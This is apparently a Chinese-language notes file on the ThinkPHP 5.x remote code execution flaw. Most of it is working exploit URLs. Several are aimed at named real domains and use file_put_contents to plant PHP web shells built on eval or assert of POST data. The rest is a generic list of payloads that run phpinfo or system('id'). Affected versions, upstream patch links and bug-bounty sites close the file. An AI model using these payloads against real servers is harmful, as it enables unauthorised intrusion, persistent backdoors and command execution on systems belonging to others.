### 发现漏洞
    域名/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=zxc1.php&vars[1][]=<?php @eval($_POST[fuck]);?>'
    
    api.91tangrenjie.com/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=fff.php&vars[1][1]=<?php print_R(scandir('/www/wwwroot/api.91tangrenjie.com/application/admin'))?>
    
    api.91tangrenjie.com/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shix1.php&vars[1][1]=<?php assert($_POST['fuck'])?>

### 发现
    api.6d2g.cn/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=tt.php&vars[1][]=<?php @eval($_POST[111]);?>
    
    ?s=index/\think\Request/input&filter=phpinfo&data=1
    ?s=index/\think\Request/input&filter=system&data=id
    ?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=
    ?s=index/\think\view\driver\Php/display&content=
    ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
    ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
    ?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
    ?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0

    http://dkfh.h8mtqt.cn/api/invoke/args?function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=notify.php&vars[1][]=<?php @eval($_POST[1111]);?>

    http://jogt.h8mtqt.cn/admin/auth/admin/invokesync?dialog=fast&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=notify.php&vars[1][]=<?php @eval($_POST[1111]);?>
    
    ReflectionFunction
       /**
     * 加载参数
     */
    public function args($function, $vars = [])
    {
        $reflect = new \ReflectionFunction($function);
        $args    = \think\App::bindParams($reflect, $vars);
        return $reflect->invokeArgs($args);
    }

### tp受影响版本 5.x < 5.1.31, <= 5.0.23

    Thinkphp v5.0.x补丁地址: https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f
    
    Thinkphp v5.1.x补丁地址: https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815

### 漏洞提交 

- 宜信安全应急响应中心 
- https://security.creditease.cn/  提交漏洞 
- https://www.anquanke.com/src
- https://butian.360.cn

### 安全类社区 

- 先知社区 seebug
- 安全客 freebuf
- tuisec 
- i春秋社区  
- 大佬的 twitter + blog
- 
- CTF平台  
- capture the flag  抢夺旗帜  获取旗帜


